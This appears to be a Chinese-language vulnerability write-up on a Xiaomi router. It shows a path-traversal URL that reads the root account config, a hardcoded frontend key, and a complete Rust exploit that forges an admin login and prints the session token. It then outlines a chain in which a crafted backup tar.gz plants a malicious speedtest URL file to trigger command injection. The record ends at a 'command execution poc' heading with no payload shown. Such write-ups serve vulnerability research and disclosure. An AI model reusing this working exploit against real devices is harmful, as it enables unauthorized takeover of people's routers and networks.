# XIAOMI_RCE
MI路由器逆向分析

# 测试日志

1.通过Binwalk提取小米路由器固件，提取信息如下

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/26fafb0e-5a82-4eab-9d86-86b4bc41d5e6/Untitled.png)

提取出来该路由器的得到ubi_rootfs文件，进入ubi_rootfs后发现未经过加密

2.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ec6877e7-b009-454a-bca2-a86201b46ba8/Untitled.png)

该处的配置可以访问任意文件读取根目录下的所有文件，而且是root权限

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a5a6726e-68c7-4bd5-aaed-c7aa7f4621a3/Untitled.png)

通过获取前端的加密代码可知密码是

```bash
var Encrypt = {
    key: 'a2ffa5c9be07488bbb04a3a47d3c5f6a',
    iv: '64175472480004614961023454661220',
    nonce: null,
    init: function(){
        var nonce = this.nonceCreat();
        this.nonce = nonce;
        return this.nonce;
    },
    nonceCreat: function(){
        var type = 0;
        // 自己的mac地址
        var deviceId = '<%=mac%>';
        var time = Math.floor(new Date().getTime() / 1000);
        var random = Math.floor(Math.random() * 10000);
        return [type, deviceId, time, random].join('_');
    },
    oldPwd : function(pwd){ // oldPwd = sha1(nonce + sha1(pwd + 'a2ffa5c9be07488bbb04a3a47d3c5f6a'))
        return CryptoJS.SHA1(this.nonce + CryptoJS.SHA1(pwd + this.key).toString()).toString();
    },
  //...
};
```

用Rust写的Exp如下：

```bash
use std::collections::HashMap;
use reqwest::blocking::{Client, RequestBuilder};
use regex::Regex;
use std::time::SystemTime;
use rand::Rng;
use sha1::Sha1;
use hex;

fn get_mac(client: &Client) -> String {
    let response = client.get("http://192.168.31.1/cgi-bin/luci/web")
        .send()
        .expect("Failed to send request");

    let re = Regex::new(r"deviceId = '(.*?)'").unwrap();
    let text = response.text().expect("Failed to get response text");
    let mac = re.captures(&text).unwrap().get(1).unwrap().as_str().to_string();
    
    mac
}

fn get_account_str(client: &Client) -> String {
    let response = client.get("http://192.168.31.1/api-third-party/download/extdisks../etc/config/account")
        .send()
        .expect("Failed to send request");

    let account_str = response.text().expect("Failed to get response text");
    println!("{}", account_str);

    let re = Regex::new(r"admin'? '(.*)'").unwrap();
    let account = re.captures(&account_str).unwrap().get(1).unwrap().as_str().to_string();
    
    account
}

fn create_nonce(mac: &str) -> String {
    let type_ = 0;
    let device_id = mac;
    let time_ = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).expect("Time went backwards").as_secs() as i64;
    let rand = rand::thread_rng().gen_range(0..10000);
    format!("{}_{}_{}_{}", type_, device_id, time_, rand)
}

fn calc_password(nonce: &str, account_str: &str) -> String {
    let mut m = Sha1::new();
    m.update(nonce.as_bytes());
    m.update(account_str.as_bytes());
    hex::encode(m.digest().bytes())
}

fn main() {
    let client = Client::new();
    
    let mac = get_mac(&client);
    let account_str = get_account_str(&client);
    let nonce = create_nonce(&mac);
    let password = calc_password(&nonce, &account_str);
    
    let mut data = HashMap::new();
    data.insert("username", "admin");
    data.insert("password", &password);
    data.insert("logtype", "2");
    data.insert("nonce", &nonce);
    
    let response = client.post("http://192.168.31.1/cgi-bin/luci/api/xqsystem/login")
        .form(&data)
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0")
        .header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
        .send()
        .expect("Failed to send login request");
    
    let text = response.text().expect("Failed to get response text");
    let re = Regex::new(r#""token":"(.*?)"#).unwrap();
    let stok = re.captures(&text).unwrap().get(1).unwrap().as_str();
    println!("stok={}", stok);
}
```

该代码可以实现任意登陆效果

备份文件是`tar.gz`格式的，上传后`tar zxf`解压，所以构造备份文件，可以控制解压目录的文件内容，结合测试上传下载速度功能的sh脚本执行时读取测试url列表文件，并将url部分直接进行命令拼接执行。

- 备份文件解压导致`/tmp/`目录任意文件可控
    
    在`/usr/lib/lua/luci/controller/api/misystem.lua`中，配置文件功能如下
    

```bash
function cUpload()
    local LuciFs = require("luci.fs")
    local XQBackup = require("xiaoqiang.module.XQBackup")
    local code = 0
    local canupload = true
    local uploadFilepath = "/tmp/cfgbackup.tar.gz"
    local fileSize = tonumber(LuciHttp.getenv("CONTENT_LENGTH"))
    if fileSize > 102400 then
        canupload = false
    end
    LuciHttp.setfilehandler(
        function(meta, chunk, eof)
            if canupload then
                if not fp then
                    if meta and meta.name == "image" then
                        fp = io.open(uploadFilepath, "w")
                    end
                end
                if chunk then
                    fp:write(chunk)
                end
                if eof then
                    fp:close()
                end
            else
                code = 1630
            end
        end
    )
    if LuciHttp.formvalue("image") and fp then
        code = 0
    end
    local result = {}
    if code == 0 then
        local ext = XQBackup.extract(uploadFilepath)
        if ext == 0 then
            result["des"] = XQBackup.getdes()
        else
            code = 1629
        end
    end
    if code ~= 0 then
        result["msg"] = XQErrorUtil.getErrorMessage(code)
        LuciFs.unlink(uploadFilepath)
    end
    result["code"] = code
    LuciHttp.write_json(result)
end
```

可知，`/tmp`目录下的任意文件可控

- `/usr/bin/upload_speedtest,/usr/bin/download_speedtest`等会读取`/tmp/speedtest_urls.xml`并提取url直接进行命令拼接，且这几个脚本可以通过web接口调用

举例，查看`/usr/bin/download_speedtest`文件

调用的地方貌似有好几个，其中`/usr/lib/lua/luci/controller/api/xqnetdetect.lua`中

```bash
function netspeed()
    local XQPreference = require("xiaoqiang.XQPreference")
    local XQNSTUtil = require("xiaoqiang.module.XQNetworkSpeedTest")
    local code = 0
    local result = {}
    local history = LuciHttp.formvalue("history")
    if history then
        result["bandwidth"] = tonumber(XQPreference.get("BANDWIDTH", 0, "xiaoqiang"))
        result["download"] = tonumber(string.format("%.2f", 128 * result.bandwidth))
        result["bandwidth2"] = tonumber(XQPreference.get("BANDWIDTH2", 0, "xiaoqiang"))
        result["upload"] = tonumber(string.format("%.2f", 128 * result.bandwidth2))
    else
        os.execute("/etc/init.d/miqos stop")
        -- 这里调用了downloadSpeedTest
        local download = XQNSTUtil.downloadSpeedTest()
        if download then
            result["download"] = download
            result["bandwidth"] = tonumber(string.format("%.2f", 8 * download/1024))
            XQPreference.set("BANDWIDTH", tostring(result.bandwidth), "xiaoqiang")
        else
            code = 1588
        end
        if code ~= 0 then
           result["msg"] = XQErrorUtil.getErrorMessage(code)
        end
        os.execute("/etc/init.d/miqos start")
    end
    
    result["code"] = code
    LuciHttp.write_json(result)
end
```

所以，我们只需要构造恶意的`speedtest_urls.xml`文件，构造备份文件，上传备份文件，然后调用网络测试相关的接口，即可以实现命令注入。

实现命令执行poc
